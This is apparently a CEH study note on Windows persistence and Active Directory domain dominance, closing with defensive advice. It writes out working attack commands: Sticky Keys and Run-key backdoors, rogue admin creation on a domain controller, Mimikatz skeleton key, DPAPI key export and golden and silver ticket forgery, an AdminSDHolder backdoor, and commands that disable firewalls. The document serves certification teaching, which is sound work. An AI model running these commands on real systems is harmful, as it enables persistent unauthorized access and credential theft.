# 06 — Persistence and Domain Dominance

**CEH Objective:** Use different techniques to hide malicious programs and maintain remote access to the system (part C — persistence & Active Directory domain dominance).

Getting in once is easy compared to *staying* in. This file covers how attackers survive reboots and password changes on a single host, and — for domain environments — how they escalate from "one compromised host" to durable, near-unkillable control over the entire Active Directory forest.

---

## 1. Windows Sticky Keys Persistence

Sticky Keys is a Windows accessibility feature (triggered by pressing Shift five times) that's reachable **from the login screen, before any authentication happens**. If an attacker with SYSTEM-level access replaces the Sticky Keys binary with a command prompt, they get a SYSTEM-level shell simply by tapping Shift five times at the lock screen — no credentials needed at all, and it survives indefinitely.

```
# Metasploit — automate the whole Sticky Keys backdoor via an existing elevated session
msf > use post/windows/manage/sticky_keys
msf post(sticky_keys) > set SESSION 1
msf post(sticky_keys) > run
```
At the next lock screen, pressing **Shift five times** pops a SYSTEM command prompt.

---

## 2. Boot/Logon Autostart Persistence

Two classic Windows mechanisms auto-run a program every time a user logs on:

```cmd
:: Registry Run Key persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\victim\backdoor.exe"

:: Startup Folder persistence — just drop a shortcut or executable here
copy backdoor.exe "C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```
Before planting either, attackers first check whether the location is actually writable/exploitable:
```cmd
:: Enumerate startup folder permissions
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

:: Same, via Sysinternals accesschk
accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

:: WinPEAS can also flag exactly these paths automatically
winPEASx64.exe quiet applicationinfo
```

---

## 3. Domain Dominance

**Domain dominance** is the AD equivalent of rootkit-level persistence: rather than backdooring one machine, the attacker embeds themselves into the trust fabric of the entire domain, so that even cleaning individual hosts doesn't remove their access. The common paths are: remote code execution against a DC, abusing DPAPI, malicious replication, and forged Kerberos tickets (skeleton key, golden ticket, silver ticket).

### Remote Code Execution Against a Domain Controller
```cmd
:: Create a rogue user directly on the DC via WMI
wmic /node:DC01 process call create "net user /add PiratedProcess Du**Y01"

:: Add that user to a privileged local group on the DC
PsExec.exe \\DC01 -accepteula net localgroup "Administrators" PiratedProcess /add
```

### Abusing DPAPI
Windows domain controllers hold a **master key** used to decrypt DPAPI-protected secrets (saved browser passwords, Wi-Fi keys, etc.) across the domain. If an attacker can extract that master key from a DC, they can decrypt DPAPI-protected blobs from *any* domain-joined machine.
```
# Mimikatz — retrieve the domain's DPAPI backup master key
lsadump::backupkeys /system:DC01 /export
```

### Skeleton Key Attack
Injects a "master password" into `lsass.exe` on a domain controller that works **in addition to** every real user's actual password — the account's real credentials keep working too, so nothing looks broken, but the attacker can now log on as *anyone* in the domain using the single injected password.
```
# Mimikatz — inject a skeleton key (default password becomes "mimikatz")
privilege::debug
misc::skeleton
```

### Golden Ticket Attack
The most powerful Kerberos forgery: using the domain's `krbtgt` account hash (extracted via DCSync — see file 03), an attacker forges a **Ticket Granting Ticket** for any user, including nonexistent ones, granting access to *any* resource in the domain, valid until they choose to stop using it (and surviving normal password changes of the impersonated account, since the ticket is forged, not stolen).
```
# Mimikatz — forge a Golden Ticket
kerberos::golden /user:fakeadmin /domain:corp.local /sid:<domain_SID> /krbtgt:<krbtgt_NTLM_hash> /ticket:golden.kirbi

# Inject it into the current session
kerberos::ptt golden.kirbi
```

### Silver Ticket Attack
A narrower forgery scoped to a **single service**, built with just that service account's NTLM hash (no `krbtgt` needed, no domain controller contact required at all — which makes it noticeably harder to detect than a Golden Ticket, since it never touches the DC).
```
# Step 1 — get domain SID and target details
whoami /user
whoami /fqdn

# Step 2 — obtain the target service account's NTLM hash (e.g. via Kerberoasting or Mimikatz)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Step 3 — forge the Silver Ticket for a specific service (e.g. CIFS on a file server)
kerberos::golden /user:fakeadmin /domain:corp.local /sid:<domain_SID> /target:fileserver01.corp.local /service:cifs /rc4:<service_account_NTLM_hash> /ticket:silver.kirbi

# Step 4 — inject and use it
kerberos::ptt silver.kirbi
```

### Maintaining Domain Persistence via AdminSDHolder
`AdminSDHolder` is the AD object whose ACL gets **automatically reapplied every hour** (by the `SDProp` process) to all protected/privileged accounts and groups. If an attacker adds themselves to *that* ACL with full rights, the hourly SDProp run keeps re-granting them privileged access even if a defender manually revokes it elsewhere — making it a remarkably durable, self-healing backdoor.
```powershell
# Add a user (Martin) to the AdminSDHolder ACL with full rights
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All

# Verify the grant took effect
Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs

# (Optional, more aggressive) shorten SDProp's cycle from 60 min to 5 min to reapply faster
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency /t REG_DWORD /f /d 300
```

---

## 4. Living-off-the-Land Command Reference

Attackers heavily favor tools that are **already present on the target OS** — they blend in with normal admin activity and rarely trigger AV signatures the way a dropped binary would.

### WMIC
```cmd
wmic os where Primary='TRUE' reboot
wmic service get name,displayname,pathname,startmode > wmic_service.txt
wmic /node:"<target>" product get name,version,vendor
wmic useraccount get name,sid
```

### Net Commands
```cmd
net config rdr
net computer \\computername /add
net view
net view \\host
net share
```

### Network Commands
```cmd
route print
netstat -r
ipconfig /all
```

### Service Commands
```cmd
sc queryex type=service state=all
net start
net stop
netsh firewall show state
netsh firewall show config
netsh advfirewall set currentprofile state off
netsh advfirewall set allprofiles state off
```

### Remote Execution Commands
```cmd
wmic /node:<IP> /user:administrator /password:$PASSWORD bios get serialnumber
taskkill.exe /S <IP> /U domain\username /F /FI "eset"
tasklist.exe /S <IP> /U domain\username
tasklist.exe /S <IP> /U domain\username /FI "USERNAME eq NT AUTHORITY\SYSTEM" /FI "STATUS eq running"
```

### Sysinternals Commands
```cmd
psexec -i \\<RemoteSystem> cmd
psexec -i \\<RemoteSystem> -c file.exe
psexec -i -d -s c:\windows\regedit.exe
psexec -i \\<RemoteSystem> ipconfig /all
```

### Metasploit — Authenticated WMI Exec via PowerShell
```
msf > use exploit/windows/local/ps_wmi_exec
msf exploit(ps_wmi_exec) > show targets
msf exploit(ps_wmi_exec) > show options
msf exploit(ps_wmi_exec) > show payloads
msf exploit(ps_wmi_exec) > show evasion
```

---

## 5. Defending Against Persistence & Domain Dominance

- Rotate the **`krbtgt`** password **twice** (back-to-back, per Microsoft's guidance) whenever a Golden Ticket compromise is suspected — rotating once is not sufficient because of password-history retention.
- Deploy a **minimum-privilege access model**; audit membership of Domain Admins and any AdminSDHolder-protected group regularly.
- Monitor for anomalous **TGT/TGS request patterns**, especially requests for service tickets to services the requesting account never normally touches.
- Alert on `GetNCChanges` requests from any host that isn't an actual domain controller (DCSync indicator).
- Use a **Kerberos ticket validation tool** to verify tickets are actually signed by a legitimate KDC.
- Restrict and monitor local administrator group membership across all systems; disable unnecessary local admin overlap between hosts to blunt lateral movement.
- Deploy **advanced threat protection (ATP)** and **UEBA** tooling capable of flagging behavior anomalies rather than relying purely on signatures.
- Regularly patch and update firmware/BIOS/UEFI as well as the OS — some persistence techniques target firmware specifically to survive OS reinstalls.
- Limit inbound traffic with host and network firewalls; disable WinRM/WMI remoting on hosts that don't need it.
- Conduct security-awareness training so that phishing — usually the *first* step that leads to any of this — is less likely to succeed in the first place.

**Next:** [07 — Covering Tracks](./07-Covering-Tracks.md)
